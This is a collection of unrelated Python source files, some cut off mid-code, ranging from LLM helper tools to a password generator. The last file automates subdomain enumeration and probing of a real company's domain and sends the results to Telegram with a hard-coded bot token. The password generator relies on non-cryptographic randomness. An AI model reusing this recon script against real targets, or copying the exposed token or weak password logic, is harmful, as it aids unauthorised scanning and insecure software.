    "from selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support.ui import WebDriverWait\r\nfrom selenium.webdriver.support import expected_conditions as EC\r\nfrom selenium.webdriver.chrome.service import Service\r\nfrom webdriver_manager.chrome import ChromeDriverManager\r\nfrom os import getcwd\r\n\r\n# Setting up Chrome options with specific arguments\r\nchrome_options = webdriver.ChromeOptions()\r\nchrome_options.add_argument(\"--use-fake-ui-for-media-stream\")\r\nchrome_options.add_argument(\"--headless=new\")\r\n\r\n# Setting up the Chrome driver with WebDriverManager and options\r\ndriver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)\r\n\r\n# Creating the URL for the website using the current working directory\r\nwebsite = \"https://allorizenproject1.netlify.app/\"\r\n\r\n# Opening the website in the Chrome browser\r\ndriver.get(website)\r\n\r\nRecog_File = f\"{getcwd()}\\\\DATA\\\\INPUT_TEXT.txt\"\r\n\r\ndef listen():\r\n    print(\"The Advance Speech To Text is Processing..\")\r\n    try:\r\n        start_button = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, 'startButton')))\r\n        start_button.click()\r\n        print(\"Activated  Sir !\")\r\n        output_text = \"\"\r\n        is_second_click = False\r\n        while True:\r\n            output_element = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'output')))\r\n            current_text = output_element.text.strip()\r\n            if \"Start Listening\" in start_button.text and is_second_click:\r\n                if output_text:\r\n                    is_second_click = False\r\n            elif \"Listening...\" in start_button.text:\r\n                is_second_click = True\r\n            if current_text != output_text:\r\n                output_text = current_text\r\n                with open(Recog_File, \"w\") as file:  \r\n                    file.write(output_text.lower())\r\n                    print(\"User:\", output_text)\r\n    except KeyboardInterrupt:\r\n        pass\r\n    except Exception as e:\r\n        print(\"An error occurred:\", e)\r\n\r\n",
    "import numpy as np\nfrom threading import Thread\nimport os\nimport psutil  # Optional for CPU usage monitoring\nimport matplotlib.pyplot as plt  # Optional for plotting\nimport time\nimport csv\n\ndef multiply_matrix(random_matrices, constant_matrix, result_matrices, start_row, end_row):\n    \"\"\"\n    Multiplies a list of random matrices with a constant matrix (row-wise) within a specified row range.\n\n    Args:\n        random_matrices (list): List of random matrices to multiply (1k x 1k).\n        constant_matrix (np.ndarray): The constant matrix (1k x 1k).\n        result_matrices (list): List of result matrices to store the products (1k x 1k).\n        start_row (int): Starting row index for multiplication.\n        end_row (int): Ending row index (exclusive) for multiplication.\n    \"\"\"\n    for i in range(start_row, end_row):\n        result_matrices[i] = np.dot(random_matrices[i], constant_matrix)\n\ndef generate_random_matrices(n, num_matrices):\n    \"\"\"\n    Generates a list of `num_matrices` random matrices of size `n` x `n`.\n\n    Args:\n        n (int): Size of each random matrix (1k in your case).\n        num_matrices (int): Number of random matrices to generate (100 in your case).\n\n    Returns:\n        list: A list containing the generated random matrices.\n    \"\"\"\n    random_matrices = []\n    for _ in range(num_matrices):\n        matrix = np.random.rand(n, n)\n        random_matrices.append(matrix)\n    return random_matrices\n\ndef get_cpu_usage():\n    \"\"\"\n    Gets the current CPU usage as a percentage.\n    \"\"\"\n    return psutil.cpu_percent(interval=1)\n\ndef main():\n    n = 2500  # Size of matrices (1k)\n    num_matrices = 100\n    constant_matrix = np.identity(n)  # Use identity matrix of size n\n\n    # Generate random matrices\n    random_matrices = generate_random_matrices(n, num_matrices)\n\n    # Create a result matrix to store the products\n    result_matrices = [np.zeros((n, n)) for _ in range(num_matrices)]\n\n    execution_times = []\n    num_threads_list = []\n\n    # Get the number of CPU cores\n    num_cores = os.cpu_count() or 1\n    print(f\"Number of CPU cores: {num_cores}\")\n\n    for num_threads in range(1, 9):\n        start_time = time.time()\n\n        threads = []\n        # Divide the workload into equal chunks for each thread\n        chunk_size = int(np.ceil(num_matrices / num_threads))\n        start_row = 0\n        for thread_id in range(num_threads):\n            end_row = min(start_row + chunk_size, num_matrices)\n            thread = Thread(target=multiply_matrix, args=(\n                random_matrices, constant_matrix, result_matrices, start_row, end_row))\n            thread.start()\n            threads.append(thread)\n            start_row = end_row\n\n        # Wait for all threads to finish\n        for thread in threads:\n            thread.join()\n\n        end_time = time.time()\n        execution_time = end_time - start_time\n        execution_times.append(execution_time)\n        num_threads_list.append(num_threads)\n\n        print(f\"Execution time with {num_threads} threads: {execution_time:.2f} seconds\")\n\n        # Optional: Get and print CPU usage during execution\n        cpu_usage = get_cpu_usage()\n        print(f\"Average CPU Usage during execution with {num_threads} threads: {cpu_usage:.2f}%\")\n\n        # Optional: Monitor memory usage during execution\n        process = psutil.Process(os.getpid())\n        memory_usage = process.memory_info().rss / (1024 ** 2)  # Memory usage in MB\n        print(f\"Memory usage during execution with {num_threads} threads: {memory_usage:.2f} MB\")\n\n    # Plot execution time against the number of threads\n    plt.figure(figsize=(10, 5))\n    plt.subplot(1, 2, 1)\n    plt.plot(num_threads_list, execution_times, marker='o')\n    plt.xlabel(\"Number of Threads\")\n    plt.ylabel(\"Execution Time (seconds)\")\n    plt.title(\"Execution Time vs. Number of Threads\")\n    plt.grid(True)\n\n    # Print or process the resulting matrices in result_matrices\n    # ...\n\n    # Plot average values of result matrices\n    plt.subplot(1, 2, 2)\n    average_values = [np.mean(matrix) for matrix in result_matrices]\n    plt.plot(range(1, num_matrices + 1), average_values)\n    plt.xlabel(\"Matrix Number\")\n    plt.ylabel(\"Average Value\")\n    plt.title(\"Average Values of Result Matrices\")\n    plt.grid(True)\n\n    plt.tight_layout()\n    plt.show()\n\n    # Write the execution time data to a CSV file\n    with open('execution_times.csv', 'w', newline='') as csvfile:\n        fieldnames = ['Number of Threads', 'Execution Time (seconds)']\n        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)\n        writer.writeheader()\n        for num_threads, execution_time in zip(num_threads_list, execution_times):\n            writer.writerow({'Number of Threads': num_threads, 'Execution Time (seconds)': execution_time})\n\nif __name__ == \"__main__\":\n    main()  # Call the main function here\n",
    "from openai import OpenAI\nimport News\nimport os\n\nGPTApikey = os.getenv(\"GPTAPIKEY\")\n\nclient = OpenAI(\n    api_key=GPTApikey\n)\ndef get_response():\n  global completion_content\n  response = client.chat.completions.create(\n    model=\"gpt-3.5-turbo\",\n    messages=[\n      {\n        \"role\": \"system\",\n        \"content\": \"You are a stock trading bot that analyses the news and based on the current events from the news you predict stock. Give me the stock symbol, not name\"\n      },\n      {\n        \"role\": \"user\",\n        \"content\": \"If you were to read the news and read the following, what stocks would you pick for the day. Only return the stock symbols and give me the top 10 you would pick. Return the stock symbols in a list with no numbers or extra characters. Only return stocks traded in U.S markets, do not return any crypto currency.  EX: SPY, APL, NVDA\"\n      },\n      {\n        \"role\": \"user\",\n        \"content\": str(News.getArticles())\n      }\n    ],\n    temperature=1,\n    max_tokens=256,\n    top_p=1,\n    frequency_penalty=0,\n    presence_penalty=0\n  )\n\n  completion_content = response.choices[0].message.content\n  return completion_content\n\ndef strip_text(text):\n  text = text.replace('[', '')\n  text = text.replace(']', '')\n  text = text.replace(\"'\", '')\n  text = text.replace('\"', '')\n  text = text.replace(\",\", '')\n  text = text.replace('\\n', ' ')\n  text = text.replace('-', '')\n  text = text.upper()\n  stocks = text.split(' ')\n  return stocks\n\n\ndef main():\n  get_response()\n  return strip_text(completion_content)\n\n",
    "import os\nimport click  # type: ignore\nimport openai  # type: ignore\nfrom anthropic import Anthropic  # type: ignore\nfrom dotenv import load_dotenv  # type: ignore\nimport cohere  # type: ignore\n\n# Load environment variables\nload_dotenv()\n\n\ndef get_api_key(api_name):\n    \"\"\"Fetches API key for a specified service from environment variables.\"\"\"\n    return os.getenv(api_name)\n\n\ndef call_model(api_name, api_key, model, system_prompt, user_prompt):\n    if api_name == \"OPENAI\":\n        response = openai.ChatCompletion.create(\n            model=model,\n            messages=[\n                {\"role\": \"system\", \"content\": system_prompt},\n                {\"role\": \"user\", \"content\": user_prompt},\n            ],\n            api_key=api_key,  # Pass the API key directly to the method\n        )\n        return response.choices[0].message[\"content\"].strip()\n    elif api_name == \"ANTHROPIC\":\n        anthropic_client = Anthropic(api_key=api_key)\n        response = anthropic_client.messages.create(\n            max_tokens=1024,\n            system=system_prompt,\n            messages=[{\"role\": \"user\", \"content\": user_prompt}],\n            model=model,\n        )\n        if isinstance(response.content, list) and response.content:\n            first_content_item = response.content[0]\n            if hasattr(first_content_item, \"text\"):\n                return first_content_item.text.strip()\n            else:\n                return \"TextBlock does not have a 'text' attribute\"\n        else:\n            return \"Unexpected content format in response or empty content\"\n    elif api_name == \"COHERE\":\n        cohere_client = cohere.Client(api_key)\n        response = cohere_client.chat(\n            model=model,\n            chat_history=[\n                {\"role\": \"system\", \"message\": system_prompt},\n                {\"role\": \"user\", \"message\": user_prompt},\n            ],\n            message=user_prompt,\n        )\n        return response.text.strip()  # Correctly accessing the 'text' attribute\n\n\ndef is_numeric(s):\n    \"\"\"Checks if a string is numeric.\"\"\"\n    try:\n        float(s)\n        return True\n    except ValueError:\n        return False\n\n\ndef parse_model_choice(input_str):\n    \"\"\"Parses user input to determine models to use.\"\"\"\n    choices = input_str.split(\",\")\n    models = []\n    for choice in choices:\n        if choice.strip() == \"1\":\n            models.append(\"OPENAI\")\n        elif choice.strip() == \"2\":\n            models.append(\"ANTHROPIC\")\n        elif choice.strip() == \"3\":\n            models.append(\"COHERE\")\n    return models\n\n\n@click.command()\n@click.option(\n    \"--models\",\n    default=\"1,2,3\",\n    help='Choose models to use: OpenAI is 1, Anthropic is 2, Cohere is 3 (use \"1,2,3\" for all).',\n)\n@click.option(\"--recursive\", is_flag=True, help=\"Enable recursive mode.\")\n@click.option(\n    \"--threshold\", default=50, type=int, help=\"Enter a quality threshold (1-100).\"\n)\n@click.option(\n    \"--initial_prompt\",\n    default=\"You are a helpful assistant\",\n    help=\"Enter an Initial System Prompt.\",\n)\n@click.argument(\"user_question\")\ndef main(models, recursive, threshold, initial_prompt, user_question):\n    openai_api_key = get_api_key(\"OPENAI_API_KEY\")\n    anthropic_api_key = get_api_key(\"ANTHROPIC_API_KEY\")\n    cohere_api_key = get_api_key(\"COHERE_API_KEY\")  # New API key for Cohere\n\n    model_list = parse_model_choice(models)\n    evaluation_system_prompt = f\"As an expert, thoroughly interpret this answer and grade it on a scale of 1-100. If it is above {threshold}, only return that number and no other information. Again, if the score is above the threshold, only return a single integer and no other text. If it is below that threshold, rewrite the answer to get it above {threshold}.\"\n\n    last_text_response = user_question\n    current_model_index = 0\n\n    while True:\n        system_prompt = (\n            initial_prompt\n            if last_text_response == user_question\n            else evaluation_system_prompt\n        )\n        model_api = model_list[current_model_index]\n        api_key = (\n            openai_api_key\n            if model_api == \"OPENAI\"\n            else (anthropic_api_key if model_api == \"ANTHROPIC\" else cohere_api_key)\n        )\n        model_name = (\n            \"gpt-4-0125-preview\"\n            if model_api == \"OPENAI\"\n            else (\n                \"claude-3-opus-20240229\"\n                if model_api == \"ANTHROPIC\"\n                else \"command-r-plus\"\n            )\n        )\n        response = call_model(\n            model_api, api_key, model_name, system_prompt, last_text_response\n        )\n        print(f\"Response from {model_api}:\", response)\n\n        if is_numeric(response):\n            score = float(response)\n            if score >= threshold:\n                print(f\"Final response meets threshold: {score}\")\n                print(\"Accepted answer:\", last_text_response)\n                break\n        else:\n            last_text_response = response\n\n        current_model_index = (\n            (current_model_index ",
    "# app/services/user_service.py\nfrom app.db import firestore\nfrom app.models.items import Items\n\n\nasync def create_user(item: Items):\n    try:\n        db = firestore.get_db()\n        item_dict = item.dict()\n        data_save = {\n            \"nombre_razon_social\": item_dict[\"nombre_razon_social\"],\n            \"codigo_postal_domicilio_fiscal\": item_dict[\n                \"codigo_postal_domicilio_fiscal\"\n            ],\n            \"regimen_fiscal\": item_dict[\"regimen_fiscal\"],\n            \"correo_electronico\": item_dict[\"correo_electronico\"],\n        }\n        db.collection(\"users\").document(item_dict[\"rfc\"]).set(data_save)\n        return {\"Status\": \"201\"}\n    except KeyError as ke:\n        return {\"Error\": \"Bad Key\", \"message\": str(ke)}\n    except Exception as e:\n        return {\"Error\": str(e)}\n\n\nasync def search_user(query: str):\n    try:\n        db = firestore.get_db()\n        user_ref = db.collection(\"users\").document(query)\n        user_doc = user_ref.get()\n        if user_doc.exists:\n            return user_doc.to_dict()\n        else:\n            return {\"Error\": \"404\"}\n    except Exception as e:\n        return {\"Error\": \"500\", \"Message\": str(e)}\n",
    "import openai\nimport keyboard\nimport pyperclip\nfrom keyboard import get_typed_strings\n\n\n\nclass AnywhereLLM:\n    '''\n    with AnywhereLLM you can store the context of the chat history and the task you are doing and generate the content for the given task by providing the context of the chat history and the task you are doing.\n    you can do this anywhere in your system by using the hotkeys.\n    hotkeys:\n    - alt+space : to add the content to the chat history\n    - shift+space : to generate the content for the given task by providing the context of the chat history and the task you are doing\n    - ctrl+shift : to clear the chat history\n    To use the AnywhereLLM  you need not provide any openai api key, you can use the chatgpt reverse proxy server to generate the content.\n\n    '''\n\n    def __init__(self, openai_api_key='anything', openai_base_url='http://localhost:3040/v1/',add_content_hotkey='alt+space',generate_hotkey='shift+space',clear_memory_hotkey='ctrl+shift'):\n        openai.api_key = openai_api_key\n        openai.base_url = openai_base_url\n        \n        self.typed_strings = []\n        self.long_term_memory = []\n        self.add_content_hotkey=add_content_hotkey\n        self.generate_hotkey=generate_hotkey\n        self.clear_memory_hotkey=clear_memory_hotkey\n    def __str__(self) -> str:\n        long_term_memory = \"long term memory :\\n\"\n        for text in self.long_term_memory:\n            long_term_memory += text + \"\\n\"\n        typed_strings = \"typed strings :\\n\"\n        for text in self.typed_strings:\n            typed_strings += text + \"\\n\"\n        hotkeys = f\"add content hotkey : {self.add_content_hotkey}\\n\"\n        hotkeys += f\"generate hotkey : {self.generate_hotkey}\\n\"\n        hotkeys += f\"clear memory hotkey : {self.clear_memory_hotkey}\\n\"\n        return long_term_memory + typed_strings + hotkeys\n\n        \n    def summarize(self,text):\n        chat_prompt = \"you are a summarizer to summarize the given text for storing as a long term memory which i can pass to ai tools like chatgpt to provide them context, summarize the text below in 50 words:\\n\"\n        prompt = chat_prompt + text   \n        completion = openai.chat.completions.create(\n            model=\"gpt-3.5-turbo\",\n            messages=[\n                {\"role\": \"user\", \"content\": prompt},\n            ],\n        )\n        result=completion.choices[0].message.content\n        self.long_term_memory.append(result)\n        print(\"summarized text : \",result)\n\n\n    def generate(self):\n        print(self.typed_strings)\n        \n        chat_prompt = \"do the following task :\\n\"\n        if self.long_term_memory:\n            chat_prompt += \"previous chat history context:\\n\"\n            for text in self.long_term_memory:\n                chat_prompt += text\n        if self.typed_strings:\n            task = self.typed_strings[-1]\n            chat_prompt += f\"task: {task}\\n\"\n            if len(self.typed_strings)>1:\n                chat_prompt += \"content for the given task :\\n\"\n                for text in self.typed_strings[:-1]:\n                    chat_prompt += text\n        else:\n            keyboard.write(\"no task to do\")\n            return\n        print(chat_prompt)\n\n        completion = openai.chat.completions.create(\n            model=\"gpt-3.5-turbo\",\n            messages=[\n                {\"role\": \"user\", \"content\": chat_prompt},\n            ],\n        )\n        result=completion.choices[0].message.content\n        \n        keyboard.write(result)\n        self.summarize(result)\n        self.typed_strings.clear()\n\n\n    def run(self):\n        keyboard.add_hotkey(self.add_content_hotkey, lambda:self.typed_strings.append(pyperclip.paste()))\n        keyboard.add_hotkey(self.generate_hotkey, self.generate)\n        keyboard.add_hotkey(self.clear_memory_hotkey, lambda:self.long_term_memory.clear())\n        \n\n        while True:\n            continue\n        \n        \n\n\nif __name__ == \"__main__\":\n    assistant = AnywhereLLM(\n        openai_api_key='YOUR_OPENAI_API_KEY',\n        openai_base_url=\"http://localhost:3040/v1/\"\n    )\n    assistant.run()\n",
    "\n#----------------------------------------------------------------------------------\n\n                #   Password generator --1\n#-------------------------------------------------------------------------------\n\n#importing libraries\nfrom tkinter import *\nfrom tkinter import Tk\nimport random\nfrom PIL import Image , ImageTk\nimport string\n#color\nco1=\"#A6A6A6\"\nco2=\"#33398\"\ncolor_1=\"#2f4f4f\"\nfg_check=\"#7FFF00\"\n\n#window\nroot=Tk()\nroot.title(\"Password Generator\")\nroot.resizable(False,False) \nroot.geometry(\"300x515\")\nroot.configure(bg=color_1)\nroot.geometry(\"300x515+{}+{}\".format(root.winfo_screenwidth() // 2 -200, root.winfo_screenheight() // 2 - 270))\n\n\n#icon_root\nimg=PhotoImage(file=\"C:/project_python/password-generator(github)/main/image/icon.png\")\nroot.iconphoto(True,img)\n\n#Logo_image\nimg=Image.open(\"C:/project_python/password-generator(github)/main/image/logo.png\")\nimg=img.resize((80,70))\nimg=ImageTk.PhotoImage(img)\napp_image=Label(root,height=60,padx=10,anchor=\"nw\",image=img,bg=color_1)\napp_image.place(x=110,y=-3)\n\n#label_password_generator\nlbl=Label(root,text=\"PASSWORD GENERATOR\",font=(\"Goudy Old Style \",14),bg=color_1,fg=\"#7fff00\")\nlbl.place(x=30,y=60)\n\n\n\n#working on frame box\nvar=IntVar()\nvar.set(10)\n\n#function to password generator\ndef password_generator():\n    lowercase_alphabet = string.ascii_lowercase\n    uppercase_alphabet = string.ascii_uppercase\n    numbers = \"0123456789\"\n    symbol = \"()[]+/;:\\ \"\n#    normal_password=(symbol+numbers+lowercase_alphabet)  \n    \n    combine=\"\" #or global combine\n    \n    \n    # uppercase alphabet\n    if state_1.get()== uppercase_alphabet:\n        combine = uppercase_alphabet\n    else:\n        pass\n    #lowercase_alphabet\n    if state_lowercase.get()== lowercase_alphabet:\n        combine += lowercase_alphabet\n    else:\n        pass\n    #numbers\n    if state_numbers.get()== numbers:\n        combine += numbers\n    else:\n        pass\n    #symbols\n    if state_symbols.get()== symbol:\n        combine += symbol\n    else:\n        pass\n    \n\n     #pass\n    #password length\n    length=int(spin.get())\n    #password\n    password=\"\".join(random.sample(combine , length))\n    #watching the password in app_password\n    app_password[\"text\"]=password\n    #function Copy the passwor\n    def copy_password():\n        info =password \n        root.clipboard_clear()\n        root.clipboard_append(password)\n        root.update()\n        messagebox.showinfo(\"PASSWORD GENERATOR\",\"password has been copied\")\n        #button_copy_password\n\n    copy_password_button=Button(root,text=\"Copy\",command=copy_password,font=(\"Arial 10 bold\"),bg=\"white\",fg=\"black\",padx=0,pady=12,width=6,height=1,relief=RAISED)    \n    copy_password_button.place(x=240,y=201)\n\n#variable\nlowercase_alphabet=string.ascii_lowercase\nuppercase_alphabet=string.ascii_uppercase\nnumber=\"0123456789\"\nsymbol=\"()[]+/;:\\ \"\n\n#normal_password=(symbol+number+lowercase_alphabet)  \ncombine=\"\"\n\n#line\nline=Label(root,text=\"Total number in password generator\",height=0,font=(\"Gadugi 10 bold\"),bg=\"#A2B5CD\",fg=\"black\")\nline.place(x=15,y=130)\n\n#spin_box\nspin=Spinbox(root,from_=8,to=20,width=30,textvariable=var)\nspin.place(x=33,y=170)\n\n#working on Frame box\napp_password=Label(root,text=\"View your password\",width=0,height=3,relief='solid',pady=0,padx=50,anchor='center',font=(\"Arial 10\"),bg=\"#333333\",fg=\"white\",activebackground=color_1)\napp_password.place(x=4,y=200)\n\n#Uppercase Label\nuppercase_label=Label(root,text=\"ABC Uppercase\",width=0,height=0,anchor='center',font=(\"Aria 13 bold\"),bg=color_1,fg=fg_check)\nuppercase_label.place(x=111,y=270)\n\nstate_1=StringVar()\nstate_1.set(False)       #set check state\n\ncheck=Checkbutton(root,width=0,height=0,var=state_1,onvalue=uppercase_alphabet,offvalue=\"off\",bg=color_1,activeforeground=color_1,activebackground=color_1)\ncheck.place(x=86,y=269)\n#lowercase Label\nlowercase_label=Label(root,text=\"abc Lowercase\",width=0,height=0,anchor='center',font=(\"Aria 13 bold\"),bg=color_1,fg=fg_check)\nlowercase_label.place(x=110,y=310)\n\nstate_lowercase=StringVar()\nstate_lowercase.set(False)\n\ncheck_lowercase=Checkbutton(root,width=0,height=0,var=state_lowercase,onvalue=lowercase_alphabet,offvalue=\"off\",bg=color_1,activeforeground=color_1,activebackground=color_1)\ncheck_lowercase.place(x=86,y=310)\n#number\nnumbers_label=Label(root,text=\"NUMBERS\",width=0,height=0,anchor='center',font=(\"Aria 13 bold\"),bg=color_1,fg=fg_check)\nnumbers_label.place(x=114,y=349)\n\nstate_numbers=StringVar()\nstate_numbers.set(False)\n\ncheck_numbers=Checkbutton(root,width=-4,height=0,var=state_numbers,onvalue=number,offvalue=\"off\",bg=color_1,activeforeground=color_1,activebackground=color_1)\ncheck_numbers.place(x=86,y=349)\n#Symbol_Label\nsymbols_label=Label(root,text=\"SYMBOLS\",width=0,height=0,anchor='center',font=(\"Aria 13 bold\"),bg=color_1,fg=fg_check)\nsymbols_label.place(x=110,y=383)\n\nstate_symbols=StringVar()\nstate_symbols.set(False)\n\ncheck_symbols=Checkbutton(root,width=-4,height=0,var=state_symbols,onvalue=symbol,pady=3,offvalue=\"off\",activeforeground=color_1,act",
    "from io import StringIO\nfrom unittest.mock import patch\n\nfrom src.befunge_interpreter import befunge_interpreter, parse_befunge_file\nimport unittest\n\n\nclass TestBefunge(unittest.TestCase):\n\n    def test_parse_befunge_file_hello_world(self):\n        self.assertEqual(parse_befunge_file(\"../examples/hello.bf\"), [\n            ['>', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', 'v'],\n            ['v', ' ', ' ', ',', ',', ',', ',', ',', '\"', 'H', 'e', 'l', 'l', 'o', '\"', '<'],\n            ['>', '4', '8', '*', ',', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', 'v'],\n            ['v', ',', ',', ',', ',', ',', ',', '\"', 'W', 'o', 'r', 'l', 'd', '!', '\"', '<'],\n            ['>', '2', '5', '*', ',', '@']\n        ])\n\n    def test_parse_befunge_file_another_hello_world(self):\n        self.assertEqual(parse_befunge_file(\"../examples/another_hello.bf\"), [\n            [' ', '>', '2', '5', '*', '\"', '!', 'd', 'l', 'r', 'o', 'w', ' ', ',', 'o', 'l', 'l', 'e', 'H', '\"', ':',\n             'v'],\n            [' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', 'v', ':', ',',\n             '_', '@'],\n            [' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', '>', ' ', ' ',\n             '^']\n        ])\n\n    def test_hello_world(self):\n        with patch(\"sys.stdout\", new=StringIO()) as stdout:\n            befunge_interpreter(parse_befunge_file(\"../examples/hello.bf\"))\n            self.assertEqual(stdout.getvalue(), \"Hello World!\\n\")\n\n    def test_another_hello_world(self):\n        with patch(\"sys.stdout\", new=StringIO()) as stdout:\n            befunge_interpreter(parse_befunge_file(\"../examples/another_hello.bf\"))\n            self.assertEqual(stdout.getvalue(), \"Hello, world!\\n\")\n\n    def test_yet_another_hello_world(self):\n        with patch(\"sys.stdout\", new=StringIO()) as stdout:\n            befunge_interpreter(parse_befunge_file(\"../examples/yet_another_hello.bf\"))\n            self.assertEqual(stdout.getvalue(), \"Hello World!\")\n",
    "from functions import *\n\n# initialize session state values\nif 'price_result' not in st.session_state:\n    st.session_state.price_result = ''\n\nif 'new_csv' not in st.session_state:\n    st.session_state.new_csv = None\n\nif 'new_data' not in st.session_state:\n    st.session_state.new_data = False\n\nif 'fitted' not in st.session_state:\n    st.session_state.fitted = False\n\n# handler for execution prediction function\ndef get_car_price():\n    result = pirce_car(brand, model, year, milage, fuel, engine, trans, accident, c_title, use_new_data)\n    st.session_state.price_result = result\n\n# some html tweaks for better visuals\nst.set_page_config(layout=\"wide\")\nst.markdown(\"\"\"\n<style>\n.big-font {\n    font-size:62px !important;\n    font-weight: bold;\n    line-height: 0.45;\n}\n</style>\n<style>\n    .stTabs [data-baseweb=\"tab-list\"] button [data-testid=\"stMarkdownContainer\"] p {\n    font-size:2rem;\n    }\n</style>\n\"\"\", unsafe_allow_html=True)\nst.markdown('Project for Computing Processes Study<p class=\"big-font\">Used cars pricing</p>created by Micha\u0142 Kozi\u0144ski</br>', unsafe_allow_html=True)\nst.write(\"\")\n\n# initialize tabs for layout creation\ntab1, tab2, tab3 = st.tabs([\"Browse offers\", \"Get your car priced\", \"Train model using new data\"])\n\n# flag that prevents of displaying errors if one of them was already catch, cause later errors are caused by previous ones\nexception_caught = False\n\ntry:\n    # get dataframe created from database records\n    df = get_df_from_db()\n    df_filtered = df.copy() # copy dataframe\n\n    with tab1:\n        # drop unneeded ID's\n        df = df.drop('ID', axis = 1)\n\n        # get list of columns\n        columns = df.columns.tolist()\n        # create selector for variables to filter\n        filter_columns = st.multiselect('Choose columns to filter by', columns)\n\n        # init filtration dictionary\n        filter_dict = {}\n        # perform filtering\n        for col in filter_columns:\n            # separate filtering for continuous and discrete variables\n            if col in ['Milage', 'Price']:\n                # continuous variables filtering is based on 2 pin sliders\n                selected_range = st.slider(f'Choose range in {col} to filter by', min(df[col]), max(df[col]), (min(df[col]), max(df[col])))\n                # filter dataframe with selected values\n                filter_dict[col] = list(range(selected_range[0], selected_range[1] + 1))\n            else:\n                # discrete variables is based on simple selector\n                # get possible values of filtered variable\n                unique_values = df[col].unique().tolist()\n                # create selector of obtained values\n                selected_values = st.multiselect(f'Choose values in {col} to filter by', unique_values)\n                # filter dataframe with selected values of the variable\n                if selected_values:\n                    filter_dict[col] = selected_values\n                    df = df[df[col].isin(selected_values)]\n\n        # filter dataframe with selected values of all variables\n        for col, vals in filter_dict.items():\n            df = df[df[col].isin(vals)]\n\n        st.header('Data')\n        # display dataframe\n        st.dataframe(df.set_index(df.columns[0]))\n\n    with tab2:\n        # create container for value inputs\n        input_cont1 = st.container()\n        with input_cont1:\n            # crete cols for first row of inputs\n            input_c11, input_c12, input_c13 = st.columns([3, 8, 1])\n            with input_c11:\n                # input of brand name\n                brand = st.selectbox('Brand', ['-'] + df_filtered['Brand'].unique().tolist())\n                # filter dataframe to limit selection other variables to the ones that fits\n                df_filtered = df_filtered[df_filtered['Brand'] == brand] if brand != '-' else df_filtered\n            with input_c12:\n                # input of model name\n                model = st.selectbox('Model', ['-'] + df_filtered['Model'].unique().tolist())\n                # filter dataframe to limit selection other variables to the ones that fits\n                df_filtered = df_filtered[df_filtered['Model'] == model] if model != '-' else df_filtered\n            with input_c13:\n                # input of year value\n                year = st.selectbox('Model year', ['-'] + df_filtered['Model_year'].unique().tolist())\n                # filter dataframe to limit selection other variables to the ones that fits\n                df_filtered = df_filtered[df_filtered['Model_year'] == year] if year != '-' else df_filtered\n            input_c21, input_c22, input_c23 = st.columns([4, 6, 2])\n            with input_c21:\n                # input of engine model name\n                engine = st.selectbox('Engine', ['-'] + df_filtered['Engine'].unique().tolist())\n                # filter dataframe to limit selection other variables to the ones that fits\n                df_filtered = df_filtered[df_filtered['Engine'] == engine] if engine != '-' else df_filtered\n      ",
    "import requests\r\nimport re\r\nimport subprocess\r\nimport json\r\nimport concurrent.futures\r\nfrom telebot import TeleBot\r\n\r\nTOKEN = \"6568272191:AAHvZqvDadJCsRgmZuodGwNy5DMgWO7-flw\"\r\nCHANNEL = -1002110734501\r\n\r\nTARGET = \"starbucks.com\"\r\nCHR = 3\r\n\r\nbot = TeleBot(TOKEN)\r\nall_subs = set()\r\nexecutor = concurrent.futures.ThreadPoolExecutor(max_workers=100)\r\n\r\ndef split_list(lst, c):\r\n    return [lst[i:i+c] for i in range(0, len(lst), c)]\r\n\r\ndef readlines(file_name):\r\n    tmp_set = set()\r\n    with open(file_name,\"r\") as f:\r\n        for line in f.readlines():\r\n            tmp_set.add(line.strip())\r\n    return tmp_set\r\n\r\ndef writelines(filename, lines):\r\n    with open(filename, \"w\") as f:\r\n        for line in lines:\r\n            f.write(line + \"\\n\")\r\n\r\ndef subfinder(target):\r\n    global all_subs\r\n    subprocess.call(['subfinder','-d',target,'-all','-o','subfinder.txt'])\r\n    [all_subs.add(x) for x in readlines(\"subfinder.txt\")]\r\n\r\ndef findomain(target):\r\n    global all_subs\r\n    subprocess.call(['findomain','-t',target,'-u','findomain.txt'])\r\n    [all_subs.add(x) for x in readlines(\"findomain.txt\")]\r\n\r\ndef shuffledns(target):\r\n    global all_subs\r\n    subprocess.call(['shuffledns','-w',f'{CHR}char.txt','-d',target,'-r','resolvers','-m','/usr/local/bin/massdns', '-o','shuffle.txt'])\r\n    [all_subs.add(x) for x in readlines(\"shuffle.txt\")]\r\n\r\ndef httpx(filename):\r\n    cmd = ['httpx', '-list', filename ,'-silent','-t','100', '-follow-host-redirects', '-title', '-status-code', '-cdn', '-tech-detect', '-H', \"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0\",'-j','-o','httpx.json']\r\n    subprocess.call(cmd)\r\n\r\ntasks = []\r\ntasks.append(executor.submit(subfinder, TARGET))\r\ntasks.append(executor.submit(findomain, TARGET))\r\n\r\n\r\nfor future in concurrent.futures.as_completed(tasks):\r\n    print(future.result(), len(all_subs))\r\n\r\nwritelines(\"allsubs.txt\", all_subs)\r\nhttpx(\"allsubs.txt\")\r\n\r\nalldata=[]\r\nwith open(\"httpx.json\",\"r\", encoding=\"utf-8\") as f:\r\n    for line in f.readlines():\r\n        data = json.loads(line.strip())\r\n        alldata.append(data)\r\n\r\nstatus_200 = [x for x in alldata if x.get(\"status_code\") == 200]\r\n\r\ni = 0\r\nfor x in split_list(status_200, 50):\r\n    txt = \"STATUS 200 :\\n\\n\"\r\n    for res in x:\r\n        i += 1\r\n        txt += f\"{i}. {res['url']} \u2014 {res['status_code']}\\n\"\r\n    bot.send_message(CHANNEL, txt)",
